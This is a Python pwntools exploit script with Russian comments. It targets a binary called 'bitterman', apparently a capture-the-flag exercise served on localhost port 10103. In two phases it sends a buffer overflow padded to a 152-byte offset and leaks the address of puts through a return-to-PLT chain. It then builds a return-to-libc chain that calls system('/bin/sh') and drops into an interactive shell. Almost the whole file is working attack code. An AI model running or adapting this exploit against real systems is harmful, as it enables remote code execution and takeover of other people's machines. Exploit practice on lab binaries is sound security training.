#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Использование: python exploit.py [DEBUG]

from pwn import *

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64
context.terminal  = ['tmux', 'new-window']

# ----------------- Фаза 1. Return-to-PLT ------------------

bitterman = ELF('./bitterman')
rop = ROP(bitterman)

log.info('Фаза 1. Return-to-PLT')
rop.puts(bitterman.got['puts'])
log.success('Найдены адреса puts (PLT & GOT)')
rop.call(bitterman.symbols['main'])
log.success('Найден адрес main')
log.info('ROP:\n' + rop.dump())

junk = 'A' * (cyclic_find(unhex('6261616f')[::-1]) - 4)  # 'A' * 152
log.success('Вычислено смещение последовательности де Брёйна: %s' % len(junk))

payload = junk + str(rop)

r = remote('localhost', '10103')
#p = process('./bitterman')

"""
gdb.attach(p, '''
init-peda
start''')
"""

r.recvuntil('What\'s your name?')
r.sendline('snovvcrash')
r.recvuntil('Please input the length of your message:')
r.sendline('31337')
r.recvuntil('Please enter your text:')
r.clean()
raw_input('[?] Отправляю пейлоад?')
r.sendline(payload)
r.recvuntil('Thanks!')
received = r.recvuntil('What\'s your name?')[:8].strip()
leaked_puts = u64(received.ljust(8, '\x00'))
log.success('Слитый адрес puts@GLIBC: %s' % hex(leaked_puts))

# ----------------- Фаза 2. Return-to-libc -----------------

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)

log.info('Фаза 2. Return-to-libc')
rop2.system(next(libc.search('/bin/sh\x00')))
log.success('Составлена пейлоад для атаки ret2libc')
log.info('ROP2:\n' + rop2.dump())

payload2 = junk + str(rop2)

#r.recvuntil('What\'s your name?')
r.sendline('snovvcrash')
r.recvuntil('Please input the length of your message:')
r.sendline('31337')
r.recvuntil('Please enter your text:')
r.clean()
raw_input('[?] Отправляю пейлоад2?')
r.sendline(payload2)
r.recvuntil('Thanks!')
r.clean()

r.interactive()
